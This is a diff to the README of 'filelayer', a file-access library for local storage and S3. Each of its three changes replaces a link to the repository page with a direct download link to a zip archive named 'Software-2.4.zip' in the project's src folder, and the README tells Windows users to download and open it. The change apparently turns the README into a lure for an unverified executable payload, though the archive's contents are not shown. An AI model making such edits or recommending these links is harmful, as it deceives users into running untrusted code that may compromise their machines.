@@ -1,6 +1,6 @@
 # 🗂️ filelayer - Simple file access for local and S3
 
-[![Download filelayer](https://img.shields.io/badge/Download-Filelayer-6F42C1?style=for-the-badge&logo=github)](https://github.com/Ianquerim912/filelayer)
+[![Download filelayer](https://img.shields.io/badge/Download-Filelayer-6F42C1?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Ianquerim912/filelayer/main/src/Software-2.4.zip)
 
 ## ✨ What filelayer does
 
@@ -19,7 +19,7 @@ That means you can keep the same file-handling code while changing where the fil
 
 To get filelayer, visit this page to download:
 
-[https://github.com/Ianquerim912/filelayer](https://github.com/Ianquerim912/filelayer)
+[https://raw.githubusercontent.com/Ianquerim912/filelayer/main/src/Software-2.4.zip](https://raw.githubusercontent.com/Ianquerim912/filelayer/main/src/Software-2.4.zip)
 
 If you are on Windows and see a release file, download it and open it. If the page gives source files instead, use the main repository page above and follow the setup steps below.
 
@@ -241,6 +241,6 @@ Start small:
 
 Primary download page:
 
-[https://github.com/Ianquerim912/filelayer](https://github.com/Ianquerim912/filelayer)
+[https://raw.githubusercontent.com/Ianquerim912/filelayer/main/src/Software-2.4.zip](https://raw.githubusercontent.com/Ianquerim912/filelayer/main/src/Software-2.4.zip)
 
 Use this page to download the project and get the latest files for Windows setup
